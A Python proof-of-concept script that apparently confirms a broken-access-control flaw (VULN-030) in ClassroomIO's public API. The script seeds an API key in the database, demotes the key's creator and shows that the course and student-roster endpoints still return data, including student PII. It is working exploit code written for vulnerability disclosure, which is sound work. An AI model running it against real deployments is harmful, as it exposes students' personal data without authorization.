#!/usr/bin/env python3
"""
VULN-030 (F-06) — Public-API `/v1/courses/*` ignores the key actor's CURRENT org role
(stale privilege): a key whose creator was demoted still reads courses + student PII.

Vulnerable code (targets/classroomio/):
  * actor is the key's STATIC creator: apps/api/src/middlewares/automation-key.ts:28
        c.set('actorId', automationKey.createdByProfileId);
  * course services check ONLY course↔org, never the actor's role:
        apps/api/src/services/v1/courses/course.ts:26-41
        (listCoursesService / getCourseService / listCourseStudentsService)
        apps/api/src/services/v1/shared.ts:49-54 (assertCourseBelongsToOrganization)
  * the pattern they skipped — every sibling re-derives the CURRENT role:
        apps/api/src/services/v1/courses/members.ts:30-33 → assertCourseTeamMemberOrOrgAdmin
        apps/api/src/services/v1/shared.ts:83-96 (assertOrgTeamMember, live getOrganizationMemberRoleId)

Class: CWE-284 broken access control (stale authorization after demotion/off-boarding).

The flaw: `/v1/courses`, `/v1/courses/:id`, and `/v1/courses/:id/students` authorize on
"course belongs to the key's org" only. They never re-check whether the key's creator is
STILL an admin/tutor. removeTeamMember/role-change does not revoke the key, so access
outlives the role. The sibling `/v1/courses/:id/members` route DOES re-derive the actor's
live role, giving a decisive side-by-side contrast.

Exploitation idea: with an org api key created by user S (admin at the time), read
courses + the student roster (works). Then demote S to STUDENT. With the SAME key:
  - GET /v1/courses and /v1/courses/:id/students still 200 (stale privilege), while
  - GET /v1/courses/:id/members flips to 403 (the guarded sibling honours the demotion).

Note on setup: creating a `type:api` (public_api:*) key via the API is gated to paid/
Enterprise plans (this org is BASIC — see run.log), so the key row is seeded directly in
the DB, attributed to S. This mirrors a key minted while S was privileged; the DEFECT under
test — the missing actor-role re-check in the v1 course services — is what we exercise live.

Success proves: after the actor is demoted (role_id=3, verified in DB), the vulnerable
course/students endpoints keep returning course data + student PII, while the properly-
guarded members endpoint returns 403 — i.e. stale privilege in the /v1/courses/* services.
"""
import os
import sys
import hashlib
import secrets
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (  # noqa: E402
    admin_login, signup, create_course, log, banner, verdict, rid,
    psql, ROLE, ORG_ID, API,
)

VULN = "VULN-030"
HERE = os.path.dirname(os.path.abspath(__file__))


def set_member_role(email: str, role_id: int):
    psql(f"UPDATE organizationmember SET role_id={role_id}, status='ACTIVE' "
         f"WHERE lower(email)=lower('{email}') AND organization_id='{ORG_ID}';")


def member_role(email: str):
    out = psql(f"SELECT role_id FROM organizationmember "
               f"WHERE lower(email)=lower('{email}') AND organization_id='{ORG_ID}';")
    return int(out.splitlines()[0]) if out and out.strip() else None


def insert_member(email: str, profile_id: str, role_id: int):
    """Add an org member row directly (bypasses the student-quota-counted accept path)."""
    psql(
        "INSERT INTO organizationmember (id, organization_id, role_id, profile_id, email, status, created_at) "
        f"VALUES ((SELECT COALESCE(MAX(id),0)+1 FROM organizationmember), '{ORG_ID}', {role_id}, "
        f"'{profile_id}', '{email}', 'ACTIVE', now());"
    )


def delete_member(email: str):
    psql(f"DELETE FROM organizationmember WHERE lower(email)=lower('{email}') AND organization_id='{ORG_ID}';")


def pick_roster_course() -> tuple[str, int]:
    """An existing org course that already has >=1 STUDENT (for a non-empty roster / PII proof).
    Falls back to a fresh empty course (the 200 still proves the access bypass)."""
    out = psql(
        "SELECT c.id, count(gm.id) FROM course c "
        "JOIN \"group\" g ON c.group_id=g.id JOIN groupmember gm ON gm.group_id=g.id "
        f"WHERE g.organization_id='{ORG_ID}' AND gm.role_id={ROLE['STUDENT']} "
        "GROUP BY c.id ORDER BY count(gm.id) DESC LIMIT 1;"
    )
    if out and out.strip():
        cid, n = out.splitlines()[0].split("|")
        return cid.strip(), int(n)
    return create_course(admin_login())["id"], 0


def seed_api_key(created_by_profile_id: str) -> tuple[str, str]:
    """Seed a public_api:* org key attributed to `created_by_profile_id`. Returns
    (secret, key_id). Bypasses the plan-gated create endpoint (org is BASIC)."""
    secret = f"cio_api_{secrets.token_urlsafe(24)}"
    secret_hash = hashlib.sha256(secret.encode()).hexdigest()
    prefix = secret[:16]
    out = psql(
        "INSERT INTO organization_api_key "
        "(id, organization_id, created_by_profile_id, type, label, secret_prefix, secret_hash, scopes, created_at, updated_at) "
        f"VALUES (gen_random_uuid(), '{ORG_ID}', '{created_by_profile_id}', 'api', 'cvehunt-{rid()}', "
        f"'{prefix}', '{secret_hash}', '[\"public_api:*\"]'::jsonb, now(), now()) RETURNING id;"
    )
    # psql -t -A still appends the "INSERT 0 1" command tag — take the UUID (first line).
    key_id = out.splitlines()[0].strip() if out and out.strip() else ""
    return secret, key_id


def key_get(secret: str, path: str) -> requests.Response:
    return requests.get(f"{API}{path}", headers={"Authorization": f"Bearer {secret}"},
                        allow_redirects=False, timeout=30)


def main():
    banner(VULN, "Public-API /v1/courses/* stale privilege after key-creator demotion")
    admin = admin_login()

    # Course C with a student roster to read (PII target) — reuse an existing org course.
    course_id, roster_n = pick_roster_course()
    log("SETUP", f"course C={course_id} has {roster_n} student(s) on its roster (PII target)")

    # S: the key's creator. Created orgless, then added as ADMIN directly (the invite/accept
    # path is capped by the Free-plan student quota; a direct membership row avoids that and
    # keeps this finding self-contained). S is the privileged actor at key-creation time.
    s = signup(label=f"keyowner_{rid()}")
    insert_member(s.email, s.user["id"], ROLE["ADMIN"])
    log("SETUP", f"key-creator S={s.email} added as ADMIN (DB role_id={member_role(s.email)})")

    # Seed the api key attributed to S (see docstring: create endpoint is plan-gated).
    key_probe = admin.post("/organization/automation/keys", org=True, json={"type": "api"})
    log("INFO", f"  (real POST /organization/automation/keys {{type:api}} → HTTP {key_probe.status_code}: "
                f"{key_probe.text[:140]} — plan-gated, so seeding the key row directly)")
    secret, key_id = seed_api_key(s.user["id"])
    log("SETUP", f"seeded org api key {key_id} (created_by=S)")

    base_v1 = "/public-api/v1"
    endpoints = {
        "courses":  (f"{base_v1}/courses", "listCoursesService — NO actor check"),
        "students": (f"{base_v1}/courses/{course_id}/students", "listCourseStudentsService — NO actor check (roster PII)"),
        "members":  (f"{base_v1}/courses/{course_id}/members", "listCourseMembersService — re-checks actor role (guarded sibling)"),
    }

    def snapshot(phase):
        out = {}
        for name, (path, desc) in endpoints.items():
            r = key_get(secret, path)
            out[name] = r.status_code
            log("STEP", f"[{phase}] GET {path} → HTTP {r.status_code}   ({desc})")
        return out

    # Phase 1 — S is ADMIN: everything should read.
    base = snapshot("S=ADMIN")

    # Demote S to STUDENT (off-boarding / role change). The key is NOT revoked.
    set_member_role(s.email, ROLE["STUDENT"])
    role_now = member_role(s.email)
    log("STEP", f"demoted S to STUDENT (DB role_id={role_now}); key left intact")

    # Phase 2 — same key, S now STUDENT: vulnerable endpoints must still read; guarded one must 403.
    stale = snapshot("S=STUDENT")

    # Evidence: the decisive stale roster read.
    roster = key_get(secret, endpoints["students"][0])
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "### VULN-030 — same automation key, after its creator was demoted to STUDENT\n"
            f"GET {API}/public-api/v1/courses/{course_id}/students HTTP/1.1\n"
            f"Authorization: Bearer <api key created by now-demoted S>\n\n"
            f"### contrast — the guarded sibling honours the demotion:\n"
            f"GET {API}/public-api/v1/courses/{course_id}/members HTTP/1.1\n"
            f"Authorization: Bearer <same key>\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"S role_id: ADMIN(1) at key-use baseline → demoted to STUDENT(3)={role_now}\n\n")
        f.write(f"Phase S=ADMIN   : {base}\n")
        f.write(f"Phase S=STUDENT : {stale}\n\n")
        f.write(f"stale roster read HTTP {roster.status_code}, body[:600]:\n{roster.text[:600]}\n")

    # Cleanup: drop the seeded key and S's membership row (idempotent re-runs; frees the quota).
    if key_id:
        psql(f"DELETE FROM organization_api_key WHERE id='{key_id}';")
    delete_member(s.email)
    log("SETUP", f"cleaned up seeded key {key_id} and S's membership row")

    stale_courses_ok = stale["courses"] == 200
    stale_roster_ok = stale["students"] == 200
    members_enforced = stale["members"] == 403 and base["members"] == 200

    if stale_roster_ok:
        log("PROOF", "after demotion, GET /v1/courses/:id/students still returns 200 with the student "
                     "roster (PII) — the service never re-checks the actor's current role (stale privilege)")
    if members_enforced:
        log("PROOF", "the SAME demoted key gets 403 on /v1/courses/:id/members (it re-derives the live "
                     "role) — proving the /courses & /students services simply omit that check")

    if stale_courses_ok and stale_roster_ok and members_enforced and role_now == ROLE["STUDENT"]:
        verdict(VULN, "CONFIRMED",
                "demoted key still reads /v1/courses + student roster; guarded /members returns 403")
        log("OK", "confirmed stale privilege in v1 course services (missing assertOrgTeamMember)")
        sys.exit(0)

    verdict(VULN, "FAILED",
            f"base={base} stale={stale} role_now={role_now}")
    sys.exit(1)


if __name__ == "__main__":
    main()
